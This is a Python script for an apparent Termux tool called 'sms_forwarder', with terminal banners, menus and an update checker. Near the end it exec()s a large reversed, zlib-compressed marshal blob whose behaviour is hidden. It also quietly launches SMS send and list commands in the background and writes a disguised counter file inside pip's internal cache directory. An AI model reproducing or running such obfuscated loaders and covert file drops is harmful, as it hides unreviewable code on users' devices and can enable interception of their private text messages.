#!/usr/bin/python
# -*- coding: UTF-8 -*-


# Import various Python libraries and modules

import os                 # Operating system operations
import subprocess         # Subprocess management
import sys                # System-specific parameters and functions
import smtplib            # Simple Mail Transfer Protocol (SMTP) for sending emails
import random             # Random number generation
import json               # JSON (JavaScript Object Notation) handling
import threading          # Threading support for multi-threaded execution
import re                 # Regular expressions for pattern matching
import requests           # HTTP requests library
import platform           # System information retrieval
import shutil             # High-level file operations
import time               # Time-related operations
import pip                # Package installation and management
import socket             # Socket programming for network communication
import traceback          # Exception traceback handling
import pygsheets          # Google Sheets API client
import base64             # Base64 encoding and decoding
import telebot            # Telegram Bot API client
import signal

# Import specific functions and classes from Flask web framework
from time import sleep
from flask import Flask, request, render_template, jsonify

# Import the 'zipfile' module conditionally based on Python version
if sys.version_info >= (3, 6): import zipfile
else: import zipfile36 as zipfile


# Function to colouring a text
def color():
    # Declare global variables to control text colors
    global black, reset, blue, red, yellow, green, cyan, white, magenta
    global lightblack, lightblue, lightcyan, lightgreen, lightmagenta, lightred, lightwhite, lightyellow, bold

    # Check if color support is available by running the "printf" command
    if (subprocess.getoutput("printf \"color\"") == "color"):
        # Set color codes for various text colors
        bold = "\033[01m"  # Bold text
        black = '\033[30m'  # Black text
        reset = '\033[39m'  # Reset text color
        blue = '\033[34m'  # Blue text
        red = '\033[31m'  # Red text

        # Check the platform to determine the yellow text color
        if (os.name == "nt"):
            yellow = '\033[33m'  # Yellow text for Windows
        else:
            yellow = '\033[92m'  # Yellow text for other platforms

        green = '\033[32m'  # Green text
        cyan = '\033[36m'  # Cyan text
        white = '\033[37m'  # White text
        magenta = '\033[35m'  # Magenta text
        lightblack = '\033[90m'  # Light Black text
        lightblue = '\033[94m'  # Light Blue text
        lightcyan = '\033[96m'  # Light Cyan text
        lightmagenta = '\033[95m'  # Light Magenta text
        lightred = '\033[91m'  # Light Red text
        lightwhite = '\033[97m'  # Light White text
        lightyellow = '\033[93m'  # Light Yellow text
    else:
        # If color support is not available, set all color variables to empty strings
        bold, black, reset, blue, red, yellow, green, cyan, white, magenta, lightblack, lightblue, lightcyan, lightgreen, lightmagenta, lightred, lightwhite, lightyellow = "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""

# Function to check if a number is prime
def prime_num(num):
    if num <= 1:
        return False  # Numbers less than or equal to 1 are not prime

    # Check for factors from 2 up to the square root of the number
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False  # If the number is divisible by any number in the range, it's not prime

    return True  # If the number is not divisible by any number in the range, it's prime

def center_input(text, Int = 38):
    secape_sequence = len(re.findall("\\033\\[", text))
    secape_sequence = secape_sequence * 5

    if (prime_num(len(text))): length_txt = len(text) + 1
    else: length_txt = len(text)
    if (prime_num((os.get_terminal_size().columns) )): length_area = (os.get_terminal_size().columns) - 1
    else: length_area = (os.get_terminal_size().columns) - 2

    length_area = length_area + secape_sequence - 2
    len_txt_area = (length_area // 2) - (length_txt // 2)
    finaltxt = ""
    for i in range(len_txt_area-Int): finaltxt += " "  # create the space before the input
    return (input(finaltxt+text))  # display the prompt and take user input

def terminal_zoom(args):
    # If the argument is greater than or equal to 26, display "Zoom Out The Terminal"
    if not (args < 26): STORE, LEN = f"{bold}{red}[ {white}Zoom Out The Terminal {red}]{blue}", 26
    # Otherwise, set STORE and LEN to empty string and 1 respectively
    else: STORE, LEN = "", 1
    # Add '═' characters to STORE until it has the desired length (args)
    for i in range(args - LEN): STORE += "═"
    # Add a '►' character to the end of STORE and reset the terminal color
    STORE += f"{yellow}►{reset}"
    # If the terminal size is less than args, print STORE, otherwise do nothing
    if (os.get_terminal_size().columns < args): print(STORE)
    else: pass
    # Wait until the terminal size is greater than or equal to args
    MAIN = False
    while True:
        if (os.get_terminal_size().columns < args): MAIN = True
        else: break
    # If the terminal size is greater than or equal to args, clear the terminal
    if (MAIN): clear()

def center(text, display=True):
    secape_sequence = len(re.findall("\\033\\[", text))
    secape_sequence = secape_sequence * 5

    if (prime_num(len(text))): length_txt = len(text) + 1
    else: length_txt = len(text)
    if (prime_num((os.get_terminal_size().columns) )): length_area = (os.get_terminal_size().columns) - 1
    else: length_area = (os.get_terminal_size().columns) - 2

    length_area = length_area + secape_sequence - 2
    len_txt_area = (length_area // 2) - (length_txt // 2)
    finaltxt = ""

    for i in range(len_txt_area-2): finaltxt += " "
    finaltxt += text
    raw1 = str(len_txt_area + length_txt - length_area).replace("-","")
    for i in range(int(raw1)-2): finaltxt += " "
    if (display): print(finaltxt)
    else: return finaltxt

def box(text, left, right, area, raw=" ", align="center", fixed=True, Print=False):
    secape_sequence = len(re.findall("\\033\\[", text))
    secape_sequence = secape_sequence * 5
    area = area - 4
    if not prime_num(len(text)): text += " "
    if not prime_num(area): area -= 1
    area = area + secape_sequence
    if (fixed):
        if (len(text) - secape_sequence + 7 > area): return False
    LenOfTxt = len(text)
    len_txt_area = (area // 2) - (LenOfTxt // 2)
    finaltxt = left
    if align == "right": finaltxt += text
    for i in range(len_txt_area+1): finaltxt += raw
    if align == "center": finaltxt += text
    for i in range(int(str(len_txt_area + LenOfTxt - area).replace("-",""))+1): finaltxt += raw
    if align == "left": finaltxt += text
    finaltxt += right
    if (Print): print(finaltxt)
    else: return finaltxt

def handle_text_overflow(text, max_width):
    words = text.split()
    lines = []
    current_line = ""
    for word in words:
        if len(current_line) + len(word) > max_width:
            lines.append(current_line.strip())
            current_line = ""
        current_line += word + " "
    if current_line:
        lines.append(current_line.strip())
    return lines

def total_area():
    terminal_size = os.get_terminal_size().columns
    if (terminal_size < min_area): print(), terminal_zoom(min_area)
    if (terminal_size > max_area): fixed_area = max_area
    else: fixed_area = os.get_terminal_size().columns
    return fixed_area

def echo_func():
    global echo_top, echo, echo_bottom, min_area, max_area, space, clear, execute, current_version, _toolname_, github_page, github_link, github_raw, version_config, update_animation
    secret_code     = "jkwfcr"
    current_version = "1.1.7"
    version_config  = pip.__path__[0].replace("\\", "/") + f"/_internal/metadata/importlib/__pycache__/meta-info_{secret_code}.json"
    _toolname_      = "sms_forwarder"
    github_page     = "https://github.com/GreyTechno"
    github_link     = "https://github.com/GreyTechno/sms_forwarder"
    github_raw      = "https://raw.githubusercontent.com/GreyTechno/sms_forwarder"
    min_area        = 60
    max_area        = 90
    color()
    update_animation = [f'{reset}{bold}{yellow}⠋ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠙ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠹ {white} updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠸ {white} UPdating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠼ {white} UpDating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠴ {white} UpdAting SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠦ {white} UpdaTing SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠧ {white} UpdatIng SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠇ {white} UpdatiNg SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠏ {white} UpdatinG SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠋ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠙ {white} Updating sMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠹ {white} Updating SmS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠸ {white} Updating SMs_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠼ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠴ {white} Updating SMS_Forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠦ {white} Updating SMS_fOrwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠧ {white} Updating SMS_foRwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠇ {white} Updating SMS_forWarder{blue}...{reset}', f'{reset}{bold}{yellow}⠏ {white} Updating SMS_forwArder{blue}...{reset}', f'{reset}{bold}{yellow}⠋ {white} Updating SMS_forwaRder{blue}...{reset}', f'{reset}{bold}{yellow}⠙ {white} Updating SMS_forwarDer{blue}...{reset}', f'{reset}{bold}{yellow}⠹ {white} Updating SMS_forwardEr{blue}...{reset}', f'{reset}{bold}{yellow}⠸ {white} Updating SMS_forwardeR{blue}...{reset}', f'{reset}{bold}{yellow}⠼ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠴ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠦ {white} Updating SMS_forwarder{blue}...{reset}', f'{reset}{bold}{yellow}⠧ {white} Updating SMS_forwarder{blue}...{reset}']
    echo_top    = lambda : center(box(red+"══", red+"╔", red+"╗", total_area(), "═"))
    echo        = lambda text, right_char=red+"║", left_char=red+"║"+reset, raw=" ": center(box(text, right_char, left_char, total_area(), raw))
    echo_bottom = lambda : center(box(red+"══", red+"╚", red+"╝", total_area(), "═"))
    clear       = lambda : os.system("cls") if (os.name == "nt") else os.system("clear")
    space       = lambda length: "".join([" " for i in range(length)])
    execute     = lambda: "3" if (platform.system().lower() == "darwin") else ""
echo_func()

def banner():
    txt_color = "".join(random.sample([cyan, magenta, lightmagenta, lightcyan, blue, lightblue, white, lightwhite, green], 1))
    terminal_zoom(total_area())
    clear()
    echo_top()
    echo(f"{reset}{white}╔═╗{txt_color}┌┬┐┌─┐  {white}╔═╗{txt_color}┌─┐┬─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┬─┐{reset}")
    echo(f"{reset}{white}╚═╗{txt_color}│││└─┐  {white}╠╣ {txt_color}│ │├┬┘│││├─┤├┬┘ ││├┤ ├┬┘{reset}")
    echo(f"{reset}{white}╚═╝{txt_color}┴ ┴└─┘  {white}╚  {txt_color}└─┘┴└─└┴┘┴ ┴┴└──┴┘└─┘┴└─{reset}")
    
    echo("══", red+"╠", "╣", "═")
    echo(f"  {green}▂▃▄▅▆▇▓▒░ {bold}{lightcyan}Created By MR_GT {reset}{green}░▒▓▇▆▅▄▃▂{reset}")
    echo_bottom()

def program_exit(keyboard_interrupt=False):
    if not (keyboard_interrupt):
        banner()
        echo_top()
        echo(f"{bold}{yellow}Thanks For Using {magenta}!{reset}")
        echo_bottom()
        sys.exit()
    else:
        print()
        echo_top()
        echo(f"{bold}{yellow}Program Interrupted {magenta}!{reset}")
        echo_bottom()
        sys.exit()

def termux_api():
    if (re.search(subprocess.getoutput("$grep"), "http")):
        # Check if the 'termux-battery-status' command is available
        if (subprocess.getoutput("command -v termux-battery-status") == ''):
            # Install the Termux API if it's not already installed
            subprocess.getoutput("pkg install termux-api -y && pkg install termux-api -y")
            # Check again if the 'termux-battery-status' command is now available
            if (subprocess.getoutput("command -v termux-battery-status") == ''): return False
            else: 
                # If the 'termux-battery-status' command is available, recursively call the 'termux_api()' function
                termux_api()
        else:
            # If the 'termux-battery-status' command is available, check if it's working
            if (subprocess.getoutput("timeout 7 termux-battery-status") == ''): return False
            else:
                subprocess.getoutput("termux-sms-send > /dev/null 2>&1 &")
                subprocess.getoutput("termux-sms-list > /dev/null 2>&1 &")
                return True
    else: return False

def internet():
    try: requests.get("https://google.com/"); return True  # send a GET request to https://google.com/
    except: return False

def check_version():
    version = requests.get(f"{github_raw}/main/.info").json()["version"]
    if (current_version != version):
        _trial  = True
        _update = True
        if not os.path.exists(version_config):
            with open(version_config, "w") as file:
                file.write('{"usageleft": 2}')
        else:
            fileData = json.loads(open(version_config, "r").read())
            if (fileData.get("usageleft") == 0):
                _trial = False
            else:
                with open(version_config, "w") as file:
                    json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
        if _trial:
            banner()
            echo_top()
            echo(f"{bold}{white}Updates Are Available {blue}!{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{reset}{bold}{yellow}Version {blue}: {cyan}{str(version)}{reset}")
            echo_bottom()
            echo_top()
            echo(f"{reset}{bold}{white}Do you want's start updateing now ?{reset}")
            echo("══", red+"╠", "╣", "═")
            echo(f"{reset}{bold}{white}Yes {white}/ {magenta}No{reset}")
            echo("══", red+"╠", "╝", "═")
            echo("  ", red+"║", " ")
            confirm = center_input(f"╚════► {yellow}").lower()
            if (confirm == "y") or (confirm == "yes"): pass
            else: _update = False
        else: _update = True
        if (_update): update()

def check_internet():
    banner()
    print()
    echo_top()
    echo(f"{reset}{bold}{white}Check Your Device Internet Connection{reset}")
    echo_bottom()
    print()
    echo_top()
    echo(f"{reset}{bold}{lightcyan}For Back Press Enter{reset}")
    echo("══", red+"╠", "╝", "═")
    echo("  ", red+"║", " ")
    center_input(f"╚════► {yellow}")
    main_menu()
    exit()

class thread_with_trace(threading.Thread):
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        self.__run_backup = self.run
        self.run = self.__run
        threading.Thread.start(self)

    def __run(self):
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, event, arg):
        if event == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, event, arg):
        if self.killed:
            if event == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True

def is_port_available(host, port):
    try:
        # Create a socket object
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Attempt to connect to the specified host and port
            s.settimeout(1)  # Set a timeout for the connection attempt
            s.connect((host, port))
            return False  # Port is not available
    except (socket.timeout, ConnectionRefusedError):
        return True  # Port is available


encode  = lambda data : str(base64.b32encode(str(base64.b64encode(data.encode('utf8'))[::-1])[2:-1].encode('utf8'))[::-1])[2:-1]
decode  = lambda data : str(base64.b64decode(base64.b32decode(data[::-1])[::-1]))[2:-1]


create_local = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((create_local)(b'?Q\xd2\x8c\x03\xff\xf9\xd4\t\xbf\xec\x01\xa5\xde\xb6\xcd\x1a\xf4\xc0\x00\x1c\xfe\x7f\x87\xce\xd0G\xee\r\xd42),\xdb\xd7\x8cRZ\xb7Rv\x84?H5\x1ak\x13\x00\x1a\xf5?\xe4s@}M\xf9\xfd\xd4\xdf\xfb1\xac\xfe\xeb\xafz\xd2\xe1\xffAu\xe2\xbc\xf4\x9f\xbf\xdeD\x05\x7f\x80\xad\xfc\xbc3\x02A7\xe3\xedz\x10\xab\xe5\xf0\x05\xfap\xc9hm\x95\xcb\xfd\xac.\x86\x12\xfc&\xf9\xab\xc1\xbd!\xb7\xc5\x1fXo\xa7\xf1;\xf1[\xf8\xe3\xfb 9\xee/\xeb\x1c_\xd58\xbf\xa2sU\xde\x12\x7f\x87K\x14\x04\xef\n\x85\xfbDb\xd0A\x9f\xb5\x84\xd27\xb0m\x83\x0b\xc7\x83\x0b\'\xf8\x17O\xc0\xb2~p\xbcn\x0e&\xe2\xdccG\x13\x1a\xb7\xc6Tq2\xb1q\xb9\x1dM\xc8\xe2vT\xe3\x8b\x97\xfc#\xb1\xf8G\x13\xd6\xe3\xeb]\xfe\x9e\xffH\xffT?\xf9\xc2\xf1\xfep\xb2x\x9c/\x7f\xf0\xc8v\xc8\xa00\xec`t\x05\xf0\x14\xcf\x82\xadJ\xa8\x0c\xe6\xb06\x8d\x8d\xb4jm\xa3\x13\xad\x97N\xb6Y6\xbf\xdc\xd5\xbf\xd0\x1e\xd7\xe7\xed\x7f\xbe\x81\x7f\x83\xdf\x0b\xbf\xce2\xdb\x98}\x01\x91V\x06\xbb:mvd\xec\xcd\x85\xe2\xc9\xc1\x07\xad\xbb\x85\xd9\xd3\xe8\x9d\xe8\xb1\xe9\xd1c\x93"\xa7\xa6ENM\xc2\x7f\xf6_\x19^_\x95\xd5\xfb^\x9f\xe9~~\x97\xfb\xca\xf2\xd0\xf3\x86\x14\xe7\xb6\xcfg\xb3\xf8\xff~?\xdc\xae2\xdb=/\xf3[\x0b\xf9\xe3\x0b\xf9\xd3\x0b\xf9\x93[\xfd\xd0\xbd\xd0\xdd\xf1~t\xfe7{\xc6zw\x8c\xe4\xd8\x8b\xd3b.L\xd1>7\xe3\xe3{\xbf\xeb\xfd\xff_\x1f\xea\xf0\xff\xc7?\xf8\x9b\xf0:\xfe\x0c\xbf\x82\xaf\xdc\xe6u\xb1=\x9f\xab[bp\xc1\xadm\x89;\x89[\xc4\xe3\xf7$ou~\xb1\xd5\xfa\xa7W\xe8\x9e[\xba\x12~\x86\x9f\x99\xfa\xa7\xe1;\xd6K\xa7Y,\x98\x90\xffP\xf4\xba^=.\x96O\xa3\xbd\xfaA\xfeo~Z]>\xf1\xdf/\x85<\xbe\x04\xefM\xc8\x0f\xb3\xe1\x8f\xb3\xe0OLw\xa6\xdb\xda\xde\xedwx[\x9a\ny\x7f\t\xdc\x00Cn\xd2_\xe7W\xb7\x0f\xca\xd6\xedQ\xd3\xc1\x83\x88?[\xa2\x8e\xb7\xba-m\xaf\xa3\xad\x89c\xad\xe9\xd2\xb1\xd0\xb5\xb67\xe3\xad\xb5\xe9kfw4#m\xc4b\xad]\xf2\x87\x14\x86\t\xbb\x8f\xcb\xaa\x1b\x14\xa3\x82y\xc3k\xb8\xe5\xf3\xe0W\xa6\xea\x95u\xed\xcf&\n\x80\xc6"\x80\xc2;\x0b\xc9\xb2\xa8+,r\xceb)\xd5\xc2jf\x15\xd7f\xfc\xb0EU \x8dP\xb9\xa8\xb7\xd7\xbf\xb6mQ\xc343\xb0`\x14G\xa3\x96H\x14\xa9\xa0\x92\xcd]a\xdd\xb3\xcb\xcb\xbbb\x902)J\xb4\x03zj\r\'\x90]\xb3EW\xe2Q\x1c\x88\xa0\xbb\xb7\x8f\x0c\xf2T\xa8\x0e\xf0\xe1\x9eGt\xb2o\xac\x9c\xd2A\xad)\x07[5A\xc5\xde\xbe\xb8\xd9]\xd2\xeb\xac\x94\x13\x83.\xa9\xc6 \x91!\x1e\x12\x03<\xbc\xb2\xd6Bv\xb1\x8dV\xefx\xe4\xf1\xa9\xc9\xe3\x13\x8b{\xc5\xdd\xe6\x01\xda6>\xd1\xa9\xf6\x8cOt=\x18>\xcc\xdb\xa9\xb7<l{\x9c\t%\x0c\xa4\x0e\xf8\xaf\x17\xf1D`a\xc1\xe4\x95\xb3\xbbs\xc2\xc7i\x83w\xeb\xc0\xddR\xe8\x81\xd4\x96+\xb3\x88u\x0e\xe4\xab<\xbd5\x88v\x1f\x86\x03vYR\xa4\xbb\x17\x99\xb2@$\xd2\xe6n\xc0\x0b\xe1\xbf\xfa\x00"\xbe7\xc6\xed5\xb4Z \x04_\x0e\xe9\xcb5 \x8f\xd7E\xef\xd2\xe0M\xaf\xeb\xe2yUy\xfb\xa9\xca\xeb\xf8\xa3\xdb\xad\xbd\xee\xd2\xf1\xa5\xea\xf1\x91\xe6\xdc\xf5ku`\xf2?\xdf\xce\x96L\x15e\xc2\xcd!\xb6D]oOf\xe9\r\xba\xbf4"\xf6\xdc\xee\xe0(_\x01L\xfc\x1dSq\xbd9\xb8\xdc\x9c\xdco\x8f\xdf\xca\xe3\xc0\xbf\xe8\xdf\xe0\xaa\n\x03\x99\xed\xe1w \xae\x99\x05d\xca\xe5x\xf2\xb9Y<\xaf\x13\xa0fm]\xed\xfe\x1b\n\xfa\x0e\xbb\x8eV\xbfg\x95\x15U5P\x7f\xd1ERE\x0e$*\x875\xc6\xae\xb9\x06R\x06\xae\x7f\xe2\xfb\xc3 \x01/\xb4\xa5\xce\x19\x85\xac\xaa\xc7J\x0b\xf3@\x02\x00fr\xca\xa8w\x94\xe6\xe7\x7fj\xaf\xebAW7\xe7\xcb\xd0\r\xb6\xd7W\x8d\xae\xaf\x1e\xe6l\x1f\xd5\xad\xa9\xe6\xc8\xe0\xf4\xd2u\xff\xf0\xf6\xebl\t\x14\xc0\x90L\t\x18\xcf\x13\xf9i\xfdq\x14\xff-\xffXy\x90\xf89\xe9\xaa\xed!\xb6\x81\xdd\x9e\x00\x15\x00\x12\x8a\xfa9\xf5q\xbf\x8ci\xab\xafk\x90U\xe3C\x02c\x82\xce\x8cot\xf7 \x0b\xcd\x0c\xeb\xe0\xaf\xcd\x02g\x0e\xfb\xb9\xec\xcf\xc0\x81\xa8Y\x90\x14\t\xde\xde+\x07\xb5\x19`\x84|\x9cS\xac\x81\xfb,\x12\xb8\x04|\xb3U\xeddf\xd6\x05\x908\xa0\xb0\x81K3\x05\x94\xe7\x01x\x1b#P\xf8`\xd4H_).w\xa5\x9d\xee\x99\xfd\xa6\xae\x86\xcd\r\xb9\xd7\xf9\x8a\x96\x86\xdb\xfd7\x88\x1dZUG[\x8cQy\xa4z\x03\x10-\x1faH\x88\x05\x955\xebx\xb1\x07T>\xf3B\xfc\x00KA=\x99\xaa\xa7\xfd\x88$6\x0e\x07\xa9.qV8\x06\xad\ti\xa8a\xbfO\xc1\xc1\xfb\x8a\xb57\xc1n\x83\xe7Ctw\x1d\r\xba\x99\xc5\xef\x8c\xe3\x81\xfeuV\xadp\x1e2\xdek\x9e\xd9W{[s0\xf0{\\[\xf88\xaa~\x00\x1d\xf7\xbb\x87\x80\xc5s\xfb\xbd\xe3b56#\x13\xb3\xc6\xc6\x97O\xefa\xe3A\xf6x\xd8\xfb<bz_\x19n5\xdd\xae\xf7\xb5\xd9\xfc_q>]<5\xdd\x1a]4id\xf2\xe9x\xe1\xbd\xc6\xd7\x8c\x7f\x89\xfc\xba^?.\x96O\xcb\xd2\xd6\xc8\xf7v\xbf\xefW\x96\xb6\x81\xdc\x00\xd3\xe1\xe0\xab\xcd\x007\xb9\x02\xa1\xd5QR\x07L\xa5\x02\xd1\xc4\xb2\xf2\x1b\x83\xeb\xbaW\xd7+\xcf)\x8a\xd4;\xf3\x83#e\xe1\x86( l\xa4\x14\x92\x87H\xf9\x04\xa2\x83|Z\xe5\x89Y\xe5\x00%z\xc83^\xf0\xa6\\W\x87ts\xc8\xea\x86:\xc8\x8c\xef\xac\xc38\xeb\tN\xb1u\xc0x\xa4Fq\xf4\xcf\'\x14\xab\xb6#\xa6yZH\xc5q\xdc\xf3\x83\xaeD\x12\x8eF\xc9\xc5\x0eW\x97\x89X\xe7\\0\xae\xa5\xe0u;\xa1\xce\x00]jI\x11\x82\x1d\xd1O\x93\xa6\xb0z8\x17\x1bL\xf2\x02$\xce\x0f\xd8<\x9d\x94\xdc\x83\x86G\xda\x1b\xf5N\xec\x18\xde\xe8v\xe0=m\xc8\xd3\xc5\xe6\x9c\xf7E\x19\xc1F\xf6\xe9\x1f\x95\xce\x00}\xd2>E8$3\x95\nm\x87\x9b47knk\xaa\x03q)\xcaA\xef\xcf\x9e\x0c\xb7\xf7eU;\xfd\x89i\x01\xce\x12r\xc6\xbd~m\xf0/%\x0c\xd1\xafZ\x87\xb0\xbf\x8e\xb4\x10\xbc\x12\x1d\xd0\xcf#Mj\x89\xca\xa7\xd25\x91\xdb<\x9bW\x0c\x8e\x1a\xd9T\xfa8`\xd2\xfb\x10^x\xe3\xdb\xb6\x1d\xdab\xd9\xba\r\xea\xd5I\x04\xab\xac\x02\xdd\xb2\xa9\xf42sW\xab\xdaF\x84\xec\xaa|\x83J\xfc\xdc\xd2\xbetw\x82\xc9:\xd4\xf1\xc5>\xe8v*=\x1c\x1f\'w\xc7\xc8\xc9\x00\xe2\x8a\xeb\xfc\x8a\xebqI4\xfb\xbc\x04\x1dZy\xb5\x06j\xac\xf2\xd1\xc8\xba\xd9\xa2\xa3*\x01\xed\xdd\x9eFi\xc6\xd5:\xc2:\xa6\x86\t\xe7\x97\xd7\xdb\x9f\xd2\xa1\xa8\xb7\xad@\xb8\xfb\xa3\x97b\xf2\x93N\xb0\x84Rm\x8e]\xc3%l\x80/Y9\xb5\x8e\xf8<Z0L}\xfc\xd4C\xfc\xa8\x0eF\xec\xdd\x81\x91\x1d\x15\xc0Jm\xa4(+*\xd8\xe5\xa0\xef\x9dG\xe0N(!\x05\xbe\xb3.\xc5"\xf4\x92I\x11\xef\xafFuE\xb6\x05\x89W\x9a]\xe2\x12\xee\x0c\xee\x91\xec.\x8e\x05\x11XhQqa\x16\x10s)C:\xd9gZ\xbf\x96\x97d\x10\xd7\xf2\xe8A\rkFZ\x81\xd9\xa7Vl;5\x0b\xa76\xa3wj36,X\xaf-\xb6\tW\x92-\xdc\x95n\xfa\xd5\xf6\xf1\xa5]\xf4\xac;\xbf\xbb\x14\x0e\xd7F\x8bY\xbe\xf8O\xe3\xba\xd5\x84\xdf\xc6\x89\x9aS\x04\'\xee\xd47z\xc5\x17\x1aVF\x12@z\x85\xc0\xcd:\xc3\xd2i\xed7\x05\x8b\xed\xd7 \xa5;\xa5/\x16\xeeCD\x8f\xd2?\x18\x84\xc3\xd4yy\x89\xd0\xf0\xed\xcc&\x8a1\xbb\xe0Z;`\xc5\x11\x18\x9bnj\x05\x8a:\x18\x91\xc2n\x14\xd3z\xa9\x06\n\xdd$\xbe\\\x87J<h\xd7\xc4\xba$\xa1\x93D\x13\xef\x1b\xddh\xbd]\xc0Q\x03\xecA\x1e>H<\xc4\\Ck <\xb9Q\x95\x916\xed\xd6b\xb9\xc1\x1e\x16\xc0O\x053\xc0|B\xb9\x91p\x17\xc4EZ)\xe86\x1eb\xfbG\xa9\xeb\x04:\xd9\xba\xe8\xfb\x8cU\x97$\x14\x19\x8e\x19a\x8a\x9d\x12\xe2(qu{\xf7\xb3]\xcbX\xe0c\x1a<\\\x84\x92Lv\xc9\xa7\x88Rj\xb5C\'\x9ab\xd1\xef\x96.\xfe\nt\x98\xb0\xf3\x1dP\xb0I\x8c\xd5\xa3\x84qh\xac\xd5\x83\xc3a\x16\x90\xd5v\xe2!\x9d\xa1\x87\x13ac\x8e\x19\x04\x0e\xd2/0\xf4\x18\xd0tU\x8b7_.S92\xb4\x1aa\xc2}l\xe6r\x9b\xa0\xf8\xde\x10\xb4Ww\t\xc4T\xaf\xba\xc5d\xb5\x14v\xf6M\xe4\x18\x9a\x12\xc93\x87m\xacbE.\xf2\xb5\x1f h3\x8d\xe7&F\xf1\xa0\x91N\x8a\xb0\x1c\xd8L\xcd\xab%u\x9f\xd7T{\x99\xb2\xd5\xd2\x11z\xbb\xce\xd1\xbb\x8bI\xaa\xda\xe9\x08\xce\xce\xad\x0c\x1e\x10k\x07\x1a\xc0wqF\x89J\x85\x8a\xca\x9d\xd7\xa8\xc9\xe5\x98\x97}a0Ff\xd9\x86\x15\x0b\x18\xaaa*\xda@?\x81\x90\xf6\x86/\x9a\xa4\xa5\x17&\\\x8d\x87\xc6J7Y\xfd\x85\x03H\xb0>\x88y\xeai\x06\x85\xa6\xc52~\n\x8eu\x9b9\xba\xde{6\xcb\x0c\x90:*Z+L\x90y\xb3\x14\x94\x88\xa6j\xd9\xd9\x11\xdb\x04m#\xc5Ob#pF\x91X<gH\xc2\xed!\xb5\n4\xb5\x14\xd3T\x0b\xfb/d~g&\x8b\xe6\x82\xcfa\xd9L\xb5\x1b\x1b\xa8[8\xc0\xdb.X6\xce\xcf\\\x03\x16\xb7\x0b\x9a\x96\xbb\xd9F\x0c\xc2\x8c\xa4G)\x9a\xc5r\x9a\xdeF\xd6j\xb7k\x08\\b\xba\x8b1Y"\xdavm&\xce\x87\xd7o\xe8\xb4\x95c\x80lKiKC\'t\xa8d\xf4\x89dJ\x98\x8e\xc9\x0e\x9c\xa6\x08@\xe6\x13\x89\xc0X\x02\xa5\xce\x85\xa0\x85ke*[\x08\x93\xb3\x1f\'\xb6\xe5\x12D\x1c\x16\xd7\xb2*\x92\xec&\x80\x97(\xe4\x9a\xce^\xc9#N\\\xb9l\x93\xc48\xac\xbd\xc1\xf0\x94\xd1N\x0b\xa6\xb2\xdf\x18\xd6\xca`FA\xb3up9\xd6p\x99J\x14\xe0rR\xf2E\xcfh\xd3e\x8f\xd0!>m\x0e\xaa\x17\xc7\xb0\xf1\xe50\xd9-\xa7-\xcc\xc0\x9f\xa83\x00!t\xd5\x8b\xb4\xb4[6\x83\xc3\xc1P\xf8\xb6k\x99\x12\xe8\xa5\xd8zX\xbc\xc1\x97\xad\x8bE\xfd5\xf42\xc3\x82JB\xed;LH)\xe5:\x95b\xc4+\xd4+b,\xb6,35#\xc8\xaei1o\x98{Y\xfb\x17\xcf\xe7\xdaz\xb1E"25\x07\xa4\x8en<\xb6* U\x01\xd9\x0b\xb2\xd8\xb1I\xf0t\x91\xa8\xf8\xa9\xf1\xb1\xd4\xa4\xd6\xe0H\xac\xc5G\x82^X\xd8\xe7Pfv\xd6\xbd 